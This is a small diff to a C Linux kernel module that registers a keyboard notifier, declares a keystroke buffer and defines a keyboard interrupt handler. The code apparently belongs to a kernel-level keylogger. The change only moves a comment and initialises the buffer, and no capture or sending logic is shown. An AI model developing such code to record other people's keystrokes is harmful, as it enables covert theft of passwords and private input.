@@ -12,7 +12,8 @@ static struct notifier_block keyboard_notifier_block = {
     .notifier_call = keyboard_notifier_callback,
 };
 
-static char keystrokes[KEY_BUFFER_SIZE + 1]; // Keyboard stroke buffer
+// Keyboard stroke buffer
+static char keystrokes[KEY_BUFFER_SIZE + 1] = ""; 
 
 // Keyboard interrupt handler
 irqreturn_t keyboard_interrupt_handler(int irq, void *dev_id) {
